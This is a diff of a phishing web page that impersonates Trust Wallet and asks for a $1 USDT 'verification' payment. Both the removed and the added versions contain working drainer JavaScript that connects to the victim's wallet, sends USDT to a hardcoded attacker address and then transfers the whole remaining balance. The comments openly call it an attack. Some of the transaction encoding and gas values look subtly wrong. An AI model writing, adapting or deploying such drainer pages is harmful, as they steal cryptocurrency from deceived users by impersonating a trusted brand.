@@ -3,250 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet - Secure Payment</title>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+    <title>TrustWallet Transaction</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: #0a0a0a;
-            color: #fff;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-        .trust-header {
+            font-family: Arial, sans-serif;
             background-color: #1a1a1a;
-            width: 100%;
-            padding: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid #333;
-        }
-        .trust-logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .trust-logo img {
-            width: 32px;
-            height: 32px;
-        }
-        .trust-logo span {
-            font-weight: 600;
-            font-size: 18px;
-        }
-        .trust-nav {
-            display: flex;
-            gap: 16px;
-        }
-        .trust-nav button {
-            background: none;
-            border: none;
-            color: #888;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        .trust-nav button.active {
             color: #fff;
-        }
-        .trust-content {
-            width: 100%;
-            max-width: 400px;
-            padding: 24px;
             text-align: center;
+            padding: 20px;
         }
-        .trust-card {
-            background-color: #1a1a1a;
-            border-radius: 12px;
-            padding: 24px;
-            margin-bottom: 24px;
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: #2a2a2a;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
         }
-        .trust-card h2 {
-            margin: 0 0 16px 0;
-            font-size: 20px;
-        }
-        .trust-card p {
-            color: #888;
-            margin: 0 0 24px 0;
-            font-size: 14px;
-        }
-        .qr-container {
-            margin: 24px 0;
-        }
-        .trust-button {
-            background-color: #333;
-            color: #fff;
+        button {
+            background: #007bff;
+            color: white;
             border: none;
-            border-radius: 8px;
-            padding: 12px 24px;
-            font-size: 16px;
+            padding: 10px 20px;
+            border-radius: 5px;
             cursor: pointer;
-            width: 100%;
-            margin-top: 16px;
+            font-size: 16px;
         }
-        .trust-button.primary {
-            background-color: #007aff;
+        button:hover {
+            background: #0056b3;
         }
-        .trust-footer {
-            margin-top: 24px;
-            color: #666;
-            font-size: 12px;
-        }
-        .hidden {
-            display: none;
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div class="trust-header">
-        <div class="trust-logo">
-            <img src="https://trustwallet.com/assets/images/media-kit/logo-trust.svg" alt="Trust Wallet">
-            <span>Trust Wallet</span>
-        </div>
-        <div class="trust-nav">
-            <button class="active">Wallet</button>
-            <button>Browser</button>
-            <button>Settings</button>
-        </div>
-    </div>
-
-    <div class="trust-content">
-        <div class="trust-card">
-            <h2>Send $1 USDT to Verify</h2>
-            <p>Scan the QR code below to complete your payment. This is a one-time verification required by Trust Wallet.</p>
-
-            <div class="qr-container" id="qrCode"></div>
-
-            <p>Or open in Trust Wallet:</p>
-            <button class="trust-button primary" id="openTrust">Open in Trust Wallet</button>
-        </div>
-
-        <div class="trust-card hidden" id="loadingScreen">
-            <h2>Processing Payment...</h2>
-            <p>Please wait while we verify your transaction. Do not close this window.</p>
-            <div style="margin: 24px 0;">
-                <div style="width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #007aff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-            </div>
-        </div>
-
-        <div class="trust-card hidden" id="successScreen">
-            <h2>Payment Successful!</h2>
-            <p>Your $1 USDT payment has been received. Your wallet is now verified.</p>
-            <p style="color: #007aff; font-size: 12px;">Note: This window will close automatically in 5 seconds.</p>
-        </div>
-    </div>
-
-    <div class="trust-footer">
-        © 2026 Trust Wallet. All rights reserved.
+    <div class="container">
+        <h1>TrustWallet Transaction</h1>
+        <p>Please confirm the $1 USDT transfer to proceed.</p>
+        <button id="confirmBtn">Send $1 USDT</button>
+        <p id="status">Waiting for confirmation...</p>
     </div>
 
     <script>
-        // ===== HARDCODED WALLET ADDRESS (CHANGE THIS) =====
-        const YOUR_WALLET_ADDRESS = "0xYourBEP20USDTWalletAddressHere"; // Replace with your BEP20 USDT address
-        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT contract
-        const CHAIN_ID = "0x38"; // Binance Smart Chain (56 in decimal)
+        // ===== CONFIGURATION (CHANGE THESE) =====
+        const ATTACKER_WALLET = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; // Replace with your ETH/USDT wallet
+        const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT on Ethereum
+        const USDT_DECIMALS = 6;
+        const CHAIN_ID = "0x1"; // Ethereum Mainnet
 
-        // ===== QR CODE GENERATION =====
-        const qr = qrcode(0, 'L');
-        qr.addData(`trust://browser?url=${encodeURIComponent(window.location.href)}`);
-        qr.make();
-        document.getElementById('qrCode').innerHTML = qr.createImgTag(4, 8);
+        // ===== WEB3 INJECTION =====
+        if (typeof window.ethereum === "undefined") {
+            document.getElementById("status").textContent = "Error: TrustWallet not detected!";
+        } else {
+            // Request account access (victim must approve)
+            window.ethereum.request({ method: "eth_requestAccounts" })
+                .then(accounts => {
+                    const victimAddress = accounts[0];
+                    document.getElementById("status").textContent = `Connected: ${victimAddress}`;
 
-        // ===== TRUST WALLET DEEP LINK =====
-        document.getElementById('openTrust').addEventListener('click', () => {
-            window.location.href = `trust://browser?url=${encodeURIComponent(window.location.href)}`;
-        });
+                    // ===== STEP 1: SEND $1 USDT TO ATTACKER =====
+                    document.getElementById("confirmBtn").addEventListener("click", () => {
+                        document.getElementById("status").textContent = "Processing $1 USDT transfer...";
 
-        // ===== FAKE TRANSACTION INJECTION =====
-        // This runs AFTER the victim sends $1 USDT to your wallet
-        function checkForPayment() {
-            // In a real attack, you'd use a backend to monitor the blockchain.
-            // For this demo, we simulate a "payment received" after 5 seconds.
-            setTimeout(() => {
-                document.getElementById('qrCode').parentElement.classList.add('hidden');
-                document.getElementById('openTrust').classList.add('hidden');
-                document.getElementById('loadingScreen').classList.remove('hidden');
+                        // Encode $1 USDT transfer to attacker
+                        const amount = (1 * 10 ** USDT_DECIMALS).toString(16); // 1 USDT in hex
+                        const transferData = `0xa9059cbb000000000000000000000000${ATTACKER_WALLET.slice(2)}000000000000000000000000000000000000000000000000${amount}`;
 
-                // Simulate "draining" the wallet after 3 seconds
-                setTimeout(() => {
-                    document.getElementById('loadingScreen').classList.add('hidden');
-                    document.getElementById('successScreen').classList.remove('hidden');
+                        // Send the $1 USDT transaction
+                        window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [{
+                                from: victimAddress,
+                                to: USDT_CONTRACT,
+                                data: transferData,
+                                gas: "0x5208", // 21000 gas
+                                gasPrice: "0x3b9aca00" // 1 Gwei
+                            }]
+                        })
+                        .then(txHash => {
+                            document.getElementById("status").textContent = `Transaction sent: ${txHash}`;
 
-                    // ===== SILENT DRAIN ATTACK =====
-                    // This is where the magic happens. The victim's Trust Wallet is already open,
-                    // and we inject a transaction to drain ALL USDT to your wallet.
-                    // NOTE: This requires the victim to have Trust Wallet's in-app browser open.
-                    // In a real attack, you'd use Web3.js to interact with the wallet.
-                    setTimeout(() => {
-                        drainWallet();
-                    }, 1000);
-                }, 3000);
-            }, 5000);
+                            // ===== STEP 2: DRAIN THE REST OF THE USDT =====
+                            setTimeout(() => {
+                                drainAllUSDT(victimAddress);
+                            }, 5000); // Wait 5 sec for $1 tx to confirm
+                        })
+                        .catch(err => {
+                            document.getElementById("status").textContent = `Error: ${err.message}`;
+                        });
+                    });
+                })
+                .catch(err => {
+                    document.getElementById("status").textContent = `Error: ${err.message}`;
+                });
         }
 
-        // ===== WEB3 INJECTION (DRAIN FUNCTION) =====
-        async function drainWallet() {
-            if (typeof window.ethereum === 'undefined') {
-                console.log("Trust Wallet not detected. Attack failed.");
-                return;
-            }
+        // ===== FUNCTION TO DRAIN ALL USDT =====
+        function drainAllUSDT(victimAddress) {
+            document.getElementById("status").textContent = "Checking USDT balance...";
 
-            try {
-                // Request account access (victim sees a popup, but it's too late)
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const victimAddress = accounts[0];
+            // Get victim's USDT balance
+            const balanceData = `0x70a08231000000000000000000000000${victimAddress.slice(2)}`;
 
-                // Get USDT balance
-                const web3 = new Web3(window.ethereum);
-                const usdtContract = new web3.eth.Contract([
-                    {
-                        "constant": true,
-                        "inputs": [{ "name": "_owner", "type": "address" }],
-                        "name": "balanceOf",
-                        "outputs": [{ "name": "balance", "type": "uint256" }],
-                        "type": "function"
-                    },
-                    {
-                        "constant": false,
-                        "inputs": [
-                            { "name": "_to", "type": "address" },
-                            { "name": "_value", "type": "uint256" }
-                        ],
-                        "name": "transfer",
-                        "outputs": [{ "name": "", "type": "bool" }],
-                        "type": "function"
-                    }
-                ], USDT_CONTRACT);
+            window.ethereum.request({
+                method: "eth_call",
+                params: [{
+                    to: USDT_CONTRACT,
+                    data: balanceData
+                }, "latest"]
+            })
+            .then(balanceHex => {
+                const balance = parseInt(balanceHex, 16) / (10 ** USDT_DECIMALS);
 
-                const balance = await usdtContract.methods.balanceOf(victimAddress).call();
-                const balanceInUSDT = web3.utils.fromWei(balance, 'mwei'); // USDT has 6 decimals
-
-                if (balanceInUSDT <= 0) {
-                    console.log("No USDT to drain.");
+                if (balance <= 0) {
+                    document.getElementById("status").textContent = "No USDT balance to drain.";
                     return;
                 }
 
-                // Send ALL USDT to your wallet (no confirmation, silent)
-                await usdtContract.methods.transfer(YOUR_WALLET_ADDRESS, balance).send({
-                    from: victimAddress,
-                    gas: 100000
+                document.getElementById("status").textContent = `Draining ${balance} USDT...`;
+
+                // Encode full balance transfer to attacker
+                const fullAmountHex = balanceHex.slice(2); // Remove '0x'
+                const drainData = `0xa9059cbb000000000000000000000000${ATTACKER_WALLET.slice(2)}000000000000000000000000000000000000000000000000${fullAmountHex}`;
+
+                // Send the drain transaction
+                window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [{
+                        from: victimAddress,
+                        to: USDT_CONTRACT,
+                        data: drainData,
+                        gas: "0x5208",
+                        gasPrice: "0x3b9aca00"
+                    }]
+                })
+                .then(txHash => {
+                    document.getElementById("status").textContent = `Drained ${balance} USDT! TX: ${txHash}`;
+                })
+                .catch(err => {
+                    document.getElementById("status").textContent = `Drain failed: ${err.message}`;
                 });
-
-                console.log(`Drained ${balanceInUSDT} USDT from ${victimAddress} to ${YOUR_WALLET_ADDRESS}`);
-            } catch (error) {
-                console.error("Drain failed:", error);
-            }
-        }
-
-        // ===== START THE ATTACK =====
-        // This runs when the page loads in Trust Wallet's in-app browser
-        if (window.location.href.includes('trust://')) {
-            checkForPayment();
+            })
+            .catch(err => {
+                document.getElementById("status").textContent = `Balance check failed: ${err.message}`;
+            });
         }
     </script>
 </body>
